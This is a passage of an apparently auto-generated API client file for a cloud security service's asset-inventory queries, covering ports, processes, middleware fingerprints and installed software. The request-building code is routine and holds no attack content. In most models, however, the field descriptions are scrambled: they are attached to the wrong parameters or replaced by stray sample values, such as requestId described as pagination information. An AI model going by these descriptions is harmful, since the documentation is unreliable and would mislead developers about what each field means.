    currentPage?: int32(name='CurrentPage', description='The number of entries returned per page.', example='1'),
    pageSize?: int32(name='PageSize', description='The total number of entries returned.', example='5'),
    totalCount?: int32(name='TotalCount', description='The number of entries returned on the current page.', example='163'),
  }(name='PageInfo', description='The page number of the returned page.'),
  propertyItems?: [ 
    {
      count?: int32(name='Count', description='The network protocol of the port.', example='495'),
      port?: string(name='Port', description='The number of servers that use the port.', example='22'),
      proto?: string(name='Proto', description='Queries information about all ports.', example='tcp'),
    }
  ](name='PropertyItems', description='The number of the listening port.'),
  requestId?: string(name='RequestId', description='The pagination information.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribePropertyPortItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyPortItemResponseBody(name='body'),
}

async function describePropertyPortItemWithOptions(request: DescribePropertyPortItemRequest, runtime: Util.RuntimeOptions): DescribePropertyPortItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.forceFlush)) {
    query['ForceFlush'] = request.forceFlush;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.port)) {
    query['Port'] = request.port;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyPortItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyPortItem(request: DescribePropertyPortItemRequest): DescribePropertyPortItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyPortItemWithOptions(request, runtime);
}

model DescribePropertyProcDetailRequest {
  cmdline?: string(name='Cmdline', description='The timestamp of last data collection. Unit: milliseconds.', example='./8888'),
  currentPage?: int32(name='CurrentPage', description='The timestamp when the process starts. Unit: milliseconds.', example='1'),
  extend?: string(name='Extend', description='The name of the process.', example='1'),
  name?: string(name='Name', description='The startup parameter of the process.', example='8888'),
  pageSize?: int32(name='PageSize', description='The name or IP address of the server.', example='10'),
  procTimeEnd?: long(name='ProcTimeEnd', description='The public IP address of the server.', example='1649587453000'),
  procTimeStart?: long(name='ProcTimeStart', description='The number of the page to return. Default value: **1**.', example='1648809853000'),
  remark?: string(name='Remark', description='1648809853000', example='192.168.XX.XX'),
  user?: string(name='User', description='The permission that is required to run the process.', example='root'),
  uuid?: string(name='Uuid', description='The private IP address of the server.', example='50d213b4-3a35-427a-b8a5-04b0c7e1****'),
}

model DescribePropertyProcDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='An array that consists of the fingerprints of the processes.', example='1'),
    currentPage?: int32(name='CurrentPage', description='./8888', example='1'),
    pageSize?: int32(name='PageSize', description='10', example='10'),
    totalCount?: int32(name='TotalCount', description='192.168.XX.XX', example='1'),
  }(name='PageInfo', description='The name of the process.'),
  propertys?: [ 
    {
      cmdline?: string(name='Cmdline', description='The startup parameter of the process.', example='./8888'),
      createTimestamp?: long(name='CreateTimestamp', description='root', example='1565686951000'),
      euidName?: string(name='EuidName', description='The time when the process starts.', example='root'),
      instanceId?: string(name='InstanceId', description='The user who runs the process.', example='i-hp35tftuh52wbp1g****'),
      instanceName?: string(name='InstanceName', description='The pagination information.', example='hc-host-****'),
      internetIp?: string(name='InternetIp', description='The ID of the process.', example='192.168.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The timestamp when the process starts. Unit: milliseconds.', example='192.168.XX.XX'),
      isPackage?: int32(name='IsPackage', description='The name of the server that is associated with the process.', example='1'),
      md5?: string(name='Md5', description='1649587453000', example='842644ea3d88bd7f7e14c1c089ef****'),
      name?: string(name='Name', description='Specifies whether fuzzy search by process name is supported. If you want to use fuzzy search, set the parameter to 1. If you set the parameter to a different value or leave the parameter empty, fuzzy search is not supported.', example='agetty'),
      path?: string(name='Path', description='The ID of the server that is associated with the process.', example='/root/Oracle/Middleware/***/8888'),
      pid?: string(name='Pid', description='The timestamp when the process ends. Unit: milliseconds.', example='12826'),
      pname?: string(name='Pname', description='1', example='start***.s'),
      startTime?: string(name='StartTime', description='The name of the parent process to which the process belongs.', example='2019-08-07 10:09:05'),
      startTimeDt?: long(name='StartTimeDt', description='The MD5 hash value of the process file.', example='1648783107000'),
      state?: string(name='State', description='The UUID of the server.', example='sleeping'),
      user?: string(name='User', description='The user who runs the process.', example='root'),
      uuid?: string(name='Uuid', description='The number of entries returned on the current page.', example='162eb349-c2d9-4f8b-805c-75b43d4c****'),
    }
  ](name='Propertys', description='1'),
  requestId?: string(name='RequestId', description='The number of entries to return on each page. Default value: **10**.', example='AA47D46F-10DE-138C-BBB4-8A0003F75CD7'),
}

model DescribePropertyProcDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyProcDetailResponseBody(name='body'),
}

async function describePropertyProcDetailWithOptions(request: DescribePropertyProcDetailRequest, runtime: Util.RuntimeOptions): DescribePropertyProcDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.cmdline)) {
    query['Cmdline'] = request.cmdline;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.extend)) {
    query['Extend'] = request.extend;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.procTimeEnd)) {
    query['ProcTimeEnd'] = request.procTimeEnd;
  }
  if (!Util.isUnset(request.procTimeStart)) {
    query['ProcTimeStart'] = request.procTimeStart;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.user)) {
    query['User'] = request.user;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyProcDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyProcDetail(request: DescribePropertyProcDetailRequest): DescribePropertyProcDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyProcDetailWithOptions(request, runtime);
}

model DescribePropertyProcItemRequest {
  currentPage?: int32(name='CurrentPage', description='The number of entries to return on each page.', example='1'),
  forceFlush?: boolean(name='ForceFlush', description='The name of the process.', example='true'),
  name?: string(name='Name', description='The number of the page to return.', example='test'),
  pageSize?: int32(name='PageSize', description='The ID of the request.', example='10'),
}

model DescribePropertyProcItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='An array that consists of the processes returned.', example='5'),
    currentPage?: int32(name='CurrentPage', description='The number of entries returned per page.', example='1'),
    pageSize?: int32(name='PageSize', description='The total number of entries returned.', example='5'),
    totalCount?: int32(name='TotalCount', description='The number of entries returned on the current page.', example='372'),
  }(name='PageInfo', description='The page number of the returned page.'),
  propertyItems?: [ 
    {
      count?: int32(name='Count', description='Queries information about all processes.', example='8888'),
      name?: string(name='Name', description='The number of servers on which the process runs.', example='.ss'),
    }
  ](name='PropertyItems', description='The name of the process.'),
  requestId?: string(name='RequestId', description='The pagination information.', example='BD8AD4C6-A169-4FA3-BA1F-ED40ED52973B'),
}

model DescribePropertyProcItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyProcItemResponseBody(name='body'),
}

async function describePropertyProcItemWithOptions(request: DescribePropertyProcItemRequest, runtime: Util.RuntimeOptions): DescribePropertyProcItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.forceFlush)) {
    query['ForceFlush'] = request.forceFlush;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyProcItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyProcItem(request: DescribePropertyProcItemRequest): DescribePropertyProcItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyProcItemWithOptions(request, runtime);
}

model DescribePropertyScaDetailRequest {
  biz?: string(name='Biz', description='The IP address that the process monitors.', example='sca'),
  bizType?: string(name='BizType', description='The type of the asset fingerprint that you want to query. Default value: **sca**. Valid values:

*   **sca**: middleware
*   **sca_database**: database
*   **sca_web**: web service

>  If you do not specify this parameter, the default value **sca** is used, which indicates that middleware fingerprints are queried.', example='system_service'),
  currentPage?: int32(name='CurrentPage', description='1', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  name?: long(name='Name', description='10', example='1'),
  pageSize?: int32(name='PageSize', description='The type of the middleware, database, or web service. Valid values:

*   **system_service**: system service
*   **software_library**: software library
*   **docker_component**: container component
*   **database**: database
*   **web_container**: web container
*   **jar**: JAR package
*   **web_framework**: web framework', example='10'),
  pid?: string(name='Pid', description='The search keyword. You must specify this parameter based on the value of the **SearchItem** parameter.

*   If the **SearchItem** parameter is set to **name**, you must enter the name of an asset fingerprint.

*   If the **SearchItem** parameter is set to **type**, you must enter the type of an asset fingerprint. Valid values:

    *   **system_service**: system service
    *   **software_library**: software library
    *   **docker_component**: container component
    *   **database**: database
    *   **web_container**: web container
    *   **jar**: JAR package
    *   **web_framework**: web framework

>  You must specify both the **SearchItem** and **SearchInfo** parameters before you can query the asset fingerprints based on the specified name or type.', example='756'),
  port?: string(name='Port', description='The type of the search condition. Valid values:

*   **name**: the name of a database, middleware, or web service
*   **type**: the type of a database, middleware, or web service

>  You must specify both the **SearchItem** and **SearchInfo** parameters before you can query the asset fingerprints based on the specified name or type.', example='68'),
  processStartedEnd?: long(name='ProcessStartedEnd', description='system_service', example='1641110965'),
  processStartedStart?: long(name='ProcessStartedStart', description='The number of entries returned on the current page.', example='1641024565'),
  remark?: string(name='Remark', description='The port of the middleware, database, or web service.', example='192.168'),
  scaName?: string(name='ScaName', description='The name of the middleware, database, or web service.', example='openssl'),
  scaNamePattern?: string(name='ScaNamePattern', description='The number of the page to return. Default value: **1**.', example='open'),
  scaVersion?: string(name='ScaVersion', description='The number of entries to return on each page. Default value: **10**.

>  We recommend that you do not leave this parameter empty.', example='1.0.2k'),
  searchInfo?: string(name='SearchInfo', description='The public IP address of the server on which the middleware, database, or web service is run.', example='openssl'),
  searchInfoSub?: string(name='SearchInfoSub', description='1641110965', example='1.0.2k'),
  searchItem?: string(name='SearchItem', description='The name of the process.', example='name'),
  searchItemSub?: string(name='SearchItemSub', description='root', example='version'),
  user?: string(name='User', description='The version of the middleware, database, or web service.', example='root'),
  uuid?: string(name='Uuid', description='The details about the asset fingerprints returned.', example='uuid-02ebabe7-1c19-ab****'),
}

model DescribePropertyScaDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The name of the server on which the middleware, database, or web service is run.', example='2'),
    currentPage?: int32(name='CurrentPage', description='name', example='1'),
    pageSize?: int32(name='PageSize', description='The public IP address of the server on which the middleware, database, or web service is run.', example='20'),
    totalCount?: int32(name='TotalCount', description='The version of the runtime environment.

>  The value of this parameter can be the Java Development Kit (JDK) version of the runtime environment for a Java process.', example='2'),
  }(name='PageInfo', description='192.168'),
  propertys?: [ 
    {
      bizType?: string(name='BizType', description='The path to the configuration file.', example='software_library'),
      bizTypeDispaly?: string(name='BizTypeDispaly', description='The UUID of the server on which the middleware, database, or web service is run.', example='System Service'),
      cmdline?: string(name='Cmdline', description='The latest collection timestamp, which indicates the last timestamp when Security Center collected the information about the middleware, database, or web service. Unit: milliseconds.', example='/sbin/dhclient -H iz2zeflhhbtk8gtxzt087az -1 -q -lf /var/lib/dhclient/dhclient--eth0.lease -pf /var/run/dhclient-eth0.pid eth0'),
      configPath?: string(name='ConfigPath', description='The name of the user who runs the process.', example='/etc/my.cnf'),
      containerName?: string(name='ContainerName', description='uuid-02ebabe7-1c19-ab****', example='5-rce_web_1'),
      createTimestamp?: long(name='CreateTimestamp', description='756', example='1597987834000'),
      imageName?: string(name='ImageName', description='The search condition, such as a server name or a server IP address.

>  Fuzzy match is supported.', example='registry-vpc.cn-beijing.aliyuncs.com/acs/aliyun-ingress-controller****'),
      instanceId?: string(name='InstanceId', description='version', example='i-2zeclqj7ti****'),
      instanceName?: string(name='InstanceName', description='The name of the container.', example='Test01'),
      internetIp?: string(name='InternetIp', description='The total number of entries returned.', example='47.42.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='1.0.2k', example='192.210.XX.XX'),
      ip?: string(name='Ip', description='openssl', example='47.42.XX.XX'),
      listenIp?: string(name='ListenIp', description='68', example='0.0.XX.XX'),
      listenProtocol?: string(name='ListenProtocol', description='The PID.', example='UDP'),
      listenStatus?: string(name='ListenStatus', description='The type of the subquery. Valid values:

*   **port**
*   **pid**
*   **version**
*   **user**', example='NONE'),
      name?: string(name='Name', description='The version verification information about the middleware, database, or web service.', example='openssl'),
      path?: string(name='Path', description='The version of the middleware, database, or web service.', example='/usr/lib64/libssl.so.1.0.2k'),
      pid?: string(name='Pid', description='The command line of the process.', example='756'),
      port?: string(name='Port', description='1', example='68'),
      ppid?: string(name='Ppid', description='The ID of the parent process.', example='1'),
      processStarted?: long(name='ProcessStarted', description='The user who runs the process.', example='1596539788'),
      processUser?: string(name='ProcessUser', description='The port that the process monitors.', example='root'),
      proof?: string(name='Proof', description='The type of the middleware, database, or web service.', example='/usr/lib64/libssl.so.1.0.2k'),
      runtimeEnvVersion?: string(name='RuntimeEnvVersion', description='open', example='1.8.0_144'),
      type?: string(name='Type', description='The name of the asset fingerprint that you want to query.', example='library'),
      uuid?: string(name='Uuid', description='The protocol of the traffic on which the process listens. Valid values:

*   **UDP**
*   **TCP**', example='uuid-02ebabe7-1c19-a****'),
      version?: string(name='Version', description='The type of the middleware, database, or web service that you want to query. Valid values:

*   **system_service**: system service
*   **software_library**: software library
*   **docker_component**: container component
*   **database**: database
*   **web_container**: web container
*   **jar**: JAR package
*   **web_framework**: web framework', example='1.0.2k'),
      webPath?: string(name='WebPath', description='zh', example='/usr/share/nginx/html'),
    }
  ](name='Propertys', description='The listening status of the process. Valid values:

*   **NONE**: not listening
*   **LISTEN**: listening'),
  requestId?: string(name='RequestId', description='1641024565', example='F9146867-16C8-4AAB-BB4FB8C2A4'),
}

model DescribePropertyScaDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyScaDetailResponseBody(name='body'),
}

async function describePropertyScaDetailWithOptions(request: DescribePropertyScaDetailRequest, runtime: Util.RuntimeOptions): DescribePropertyScaDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.biz)) {
    query['Biz'] = request.biz;
  }
  if (!Util.isUnset(request.bizType)) {
    query['BizType'] = request.bizType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.pid)) {
    query['Pid'] = request.pid;
  }
  if (!Util.isUnset(request.port)) {
    query['Port'] = request.port;
  }
  if (!Util.isUnset(request.processStartedEnd)) {
    query['ProcessStartedEnd'] = request.processStartedEnd;
  }
  if (!Util.isUnset(request.processStartedStart)) {
    query['ProcessStartedStart'] = request.processStartedStart;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.scaName)) {
    query['ScaName'] = request.scaName;
  }
  if (!Util.isUnset(request.scaNamePattern)) {
    query['ScaNamePattern'] = request.scaNamePattern;
  }
  if (!Util.isUnset(request.scaVersion)) {
    query['ScaVersion'] = request.scaVersion;
  }
  if (!Util.isUnset(request.searchInfo)) {
    query['SearchInfo'] = request.searchInfo;
  }
  if (!Util.isUnset(request.searchInfoSub)) {
    query['SearchInfoSub'] = request.searchInfoSub;
  }
  if (!Util.isUnset(request.searchItem)) {
    query['SearchItem'] = request.searchItem;
  }
  if (!Util.isUnset(request.searchItemSub)) {
    query['SearchItemSub'] = request.searchItemSub;
  }
  if (!Util.isUnset(request.user)) {
    query['User'] = request.user;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyScaDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyScaDetail(request: DescribePropertyScaDetailRequest): DescribePropertyScaDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyScaDetailWithOptions(request, runtime);
}

model DescribePropertyScaItemRequest {
  biz?: string(name='Biz', description='The type of the asset fingerprint that you want to query. Default value: **sca**. Valid values:

*   **sca**: middleware
*   **sca_database**: database
*   **sca_web**: web service

> If you do not specify this parameter, the default value **sca** is used, which indicates that middleware fingerprints are queried.', example='sca'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  forceFlush?: boolean(name='ForceFlush', description='Specifies whether to forcefully refresh the data that you want to query. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.

> We recommend that you do not leave this parameter empty.', example='20'),
  searchInfo?: string(name='SearchInfo', description='The search keyword. You must specify this parameter based on the value of the **SearchItem** parameter.

*   If the **SearchItem** parameter is set to **name**, you must enter the name of an asset fingerprint.

*   If the **SearchItem** parameter is set to **type**, you must enter the type of an asset fingerprint. Valid values:

    *   **system_service**: system service
    *   **software_library**: software library
    *   **docker_component**: container component
    *   **database**: database
    *   **web_container**: web container
    *   **jar**: JAR package
    *   **web_framework**: web framework

> You must specify both the **SearchItem** and **SearchInfo** parameters before you can query the asset fingerprints based on the specified name or type.', example='system_service'),
  searchItem?: string(name='SearchItem', description='The type of the search condition. Valid values:

*   **name**: the name of a database, middleware, or web service
*   **type**: the type of a database, middleware, or web service

> You must specify both the **SearchItem** and **SearchInfo** parameters before you can query the asset fingerprints based on the specified name or type.', example='type'),
}

model DescribePropertyScaItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='27'),
  }(name='PageInfo', description='The pagination information.'),
  propertyItems?: [ 
    {
      bizType?: string(name='BizType', description='The type of the middleware, database, or web service. Valid values:

*   **system_service**: system service
*   **software_library**: software library
*   **docker_component**: container component
*   **database**: database
*   **web_container**: web container
*   **jar**: JAR package
*   **web_framework**: web framework', example='docker_component'),
      count?: int32(name='Count', description='The number of servers on which the middleware is run.', example='23'),
      name?: string(name='Name', description='The name of the middleware.', example='kubelet'),
      typeDisplay?: string(name='TypeDisplay', description='The display name of the middleware type.', example='Docker Component'),
    }
  ](name='PropertyItems', description='An array that consists of the information about middleware fingerprints.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3F4236AB-7070-538D-85EB-98EBFE6C****'),
}

model DescribePropertyScaItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyScaItemResponseBody(name='body'),
}

async function describePropertyScaItemWithOptions(request: DescribePropertyScaItemRequest, runtime: Util.RuntimeOptions): DescribePropertyScaItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.biz)) {
    query['Biz'] = request.biz;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.forceFlush)) {
    query['ForceFlush'] = request.forceFlush;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.searchInfo)) {
    query['SearchInfo'] = request.searchInfo;
  }
  if (!Util.isUnset(request.searchItem)) {
    query['SearchItem'] = request.searchItem;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyScaItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyScaItem(request: DescribePropertyScaItemRequest): DescribePropertyScaItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyScaItemWithOptions(request, runtime);
}

model DescribePropertyScheduleConfigRequest {
  type?: string(name='Type', example='scheduler_autorun_period'),
}

model DescribePropertyScheduleConfigResponseBody = {
  config?: string(name='Config', example='3'),
  requestId?: string(name='RequestId', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribePropertyScheduleConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyScheduleConfigResponseBody(name='body'),
}

async function describePropertyScheduleConfigWithOptions(request: DescribePropertyScheduleConfigRequest, runtime: Util.RuntimeOptions): DescribePropertyScheduleConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyScheduleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyScheduleConfig(request: DescribePropertyScheduleConfigRequest): DescribePropertyScheduleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyScheduleConfigWithOptions(request, runtime);
}

model DescribePropertySoftwareDetailRequest {
  currentPage?: int32(name='CurrentPage', description='The name of the software.', example='1'),
  extend?: string(name='Extend', description='10', example='1'),
  installTimeEnd?: long(name='InstallTimeEnd', description='3.10.0', example='1650012695000'),
  installTimeStart?: long(name='InstallTimeStart', description='The name of the software.', example='1649321495000'),
  name?: string(name='Name', description='The details of the software asset.', example='kernel'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10'),
  path?: string(name='Path', description='The name or IP address of the server.', example='/etc/test'),
  remark?: string(name='Remark', description='The private IP address of the server.', example='192.168.XX.XX'),
  softwareVersion?: string(name='SoftwareVersion', description='The number of the page to return. Default value: **1**.', example='3.10.0'),
  uuid?: string(name='Uuid', description='The public IP address of the server.', example='50d213b4-3a35-427a-b8a5-****'),
}

model DescribePropertySoftwareDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The version of the software.', example='1'),
    currentPage?: int32(name='CurrentPage', description='1', example='1'),
    pageSize?: int32(name='PageSize', description='The timestamp at which the software update ends. Unit: milliseconds.', example='10'),
    totalCount?: int32(name='TotalCount', description='The installation path of the software.', example='1'),
  }(name='PageInfo', description='The details of the software asset.'),
  propertys?: [ 
    {
      createTimestamp?: long(name='CreateTimestamp', description='The timestamp at which the software is installed. Unit: milliseconds.', example='1649149566000'),
      installTime?: string(name='InstallTime', description='The ID of the server.', example='2022-04-07 10:54:49'),
      installTimeDt?: long(name='InstallTimeDt', description='The UUID of the server.', example='1649066826000'),
      instanceId?: string(name='InstanceId', description='1', example='i-hp35tftuh52wbp1g****'),
      instanceName?: string(name='InstanceName', description='/etc/test', example='hc-host-****'),
      internetIp?: string(name='InternetIp', description='The timestamp at which the software update starts. Unit: milliseconds.', example='192.168.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The pagination information.', example='100.104.XX.XX'),
      ip?: string(name='Ip', description='The number of entries returned on the current page.', example='192.168.XX.XX'),
      name?: string(name='Name', description='The name of the server.', example='aaa_base'),
      path?: string(name='Path', description='The IP addresses of the server.', example='/etc/test'),
      uuid?: string(name='Uuid', description='1650012695000', example='162eb349-c2d9-4f8b-805c-75b43d4c****'),
      version?: string(name='Version', description='Specifies whether fuzzy search by software name is supported. If you want to use fuzzy search, set the parameter to 1. If you set the parameter to a different value or leave the parameter empty, fuzzy search is not supported.', example='3.10.0'),
    }
  ](name='Propertys', description='The version of the software.'),
  requestId?: string(name='RequestId', description='192.168.XX.XX', example='6AEE7412-0065-1135-B790-AE2C38BA68FB'),
}

model DescribePropertySoftwareDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertySoftwareDetailResponseBody(name='body'),
}

async function describePropertySoftwareDetailWithOptions(request: DescribePropertySoftwareDetailRequest, runtime: Util.RuntimeOptions): DescribePropertySoftwareDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.extend)) {
    query['Extend'] = request.extend;
  }
  if (!Util.isUnset(request.installTimeEnd)) {
    query['InstallTimeEnd'] = request.installTimeEnd;
  }
  if (!Util.isUnset(request.installTimeStart)) {
    query['InstallTimeStart'] = request.installTimeStart;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.path)) {
    query['Path'] = request.path;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.softwareVersion)) {
    query['SoftwareVersion'] = request.softwareVersion;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertySoftwareDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertySoftwareDetail(request: DescribePropertySoftwareDetailRequest): DescribePropertySoftwareDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertySoftwareDetailWithOptions(request, runtime);
}

model DescribePropertySoftwareItemRequest {
  currentPage?: int32(name='CurrentPage', description='The name of the software that you want to query.', example='1'),
  forceFlush?: boolean(name='ForceFlush', description='The number of servers on which the software is installed.', example='true'),
  name?: string(name='Name', description='The pagination information.', example='test'),
  pageSize?: int32(name='PageSize', description='1', example='10'),
}

model DescribePropertySoftwareItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='Queries information about all software assets.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The number of entries returned per page.', example='1'),
    pageSize?: int32(name='PageSize', description='The ID of the request.', example='2'),
    totalCount?: int32(name='TotalCount', description='true', example='5037'),
  }(name='PageInfo', description='10'),
  propertyItems?: [ 
    {
      count?: int32(name='Count', example='23'),
      name?: string(name='Name', example='aaa_base'),
    }
  ](name='PropertyItems', description='DescribePropertySoftwareItem'),
  requestId?: string(name='RequestId', description='The name of the software.', example='3A85CFCF-05C8-451A-9E41-C0D5E96BA407'),
}

model DescribePropertySoftwareItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertySoftwareItemResponseBody(name='body'),
}

async function describePropertySoftwareItemWithOptions(request: DescribePropertySoftwareItemRequest, runtime: Util.RuntimeOptions): DescribePropertySoftwareItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.forceFlush)) {
    query['ForceFlush'] = request.forceFlush;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertySoftwareItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertySoftwareItem(request: DescribePropertySoftwareItemRequest): DescribePropertySoftwareItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertySoftwareItemWithOptions(request, runtime);
}

model DescribePropertyTypeScaItemRequest {
